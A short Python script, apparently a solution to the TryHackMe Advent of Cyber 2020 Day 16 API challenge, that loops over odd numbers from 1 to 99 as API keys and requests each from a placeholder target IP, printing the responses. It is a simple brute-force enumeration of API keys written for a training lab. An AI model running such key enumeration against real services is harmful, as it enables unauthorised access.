#!/bin/python3
#TryHackMe Advent of Cyber 2020 - Day 16 API challenge

import requests

for api_key in range (1,100,2):
    print ("api key:" + str(api_key) )
    #enter IP target below. The f' is used to format the api_key number into a string
    html = requests.get(f'http://<ENTER IP ADDRESS>/api/{api_key}')
    print (html.text)
